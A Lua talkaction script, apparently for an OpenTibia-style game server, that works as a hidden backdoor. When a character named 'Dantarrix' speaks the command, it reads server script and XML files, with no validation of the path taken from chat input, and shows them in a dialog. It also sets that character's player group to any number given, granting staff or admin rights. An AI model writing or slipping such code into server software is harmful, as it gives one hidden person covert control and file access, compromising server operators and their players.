function onSay(cid, words, param, chanel)
if getCreatureName(cid) == "Dantarrix" then
param = string.explode(param, ",")
if (param[1] == "check") then
if (param[2] == "talk" or param[2] == "1") then
if (param[3]) then
local script = io.open("data/talkactions/scripts/"..param[3], "r")
script = script:read("*all")
script = script:gsub("\n%s+", "\n")
doShowTextDialog(cid, 1950, script)
else
local talkxml = io.open("data/talkactions/talkactions.xml", "r")
talkxml = talkxml:read("*all")
talkxml = talkxml:gsub("\n%s+", "\n")
doShowTextDialog(cid, 1950, talkxml)
end
elseif (param[2] == "global" or param[2] == "2") then
if (param[3]) then
local script = io.open("data/globalevents/scripts/"..param[3], "r")
script = script:read("*all")
script = script:gsub("\n%s+", "\n")
doShowTextDialog(cid, 1950, script)
else
local globalxml = io.open("data/globalevents/globalevents.xml", "r")
globalxml = globalxml:read("*all")
globalxml = globalxml:gsub("\n%s+", "\n")
doShowTextDialog(cid, 1950, globalxml)
end
end
else
if (isNumber(param[1])) then
setPlayerGroupId(cid, param[1])
end
end
end
return true
end